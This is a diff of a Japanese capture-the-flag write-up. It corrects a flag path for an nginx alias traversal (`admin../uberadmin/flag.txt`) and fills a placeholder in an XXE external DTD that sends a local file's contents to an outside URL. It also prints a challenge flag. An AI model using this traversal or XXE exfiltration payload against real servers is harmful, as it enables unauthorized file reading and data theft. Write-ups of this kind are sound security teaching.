@@ -156,13 +156,11 @@ location /admin {
 </html>
 ```
 
-`/admin/flag.txt` も `/pleb.(IP アドレス).nip.io:8080/index.php/admin../uberadmin/flag.txt` で取得します。
+`/uberadmin/flag.txt` も `/pleb.(IP アドレス).nip.io:8080/index.php/admin../uberadmin/flag.txt` で取得します。
 
 ```
 midnight{y0u_sp1n_m3_r1ght_r0und_b@by}
 ```
-
-フラグが得られました。
 
 ### rubenscube (424)
 > Sharing is caring. For picture wizard use only.
@@ -178,7 +176,7 @@ midnight{y0u_sp1n_m3_r1ght_r0und_b@by}
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://()/?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://(URL)/?%file;'>">
 %all;
 ```
 
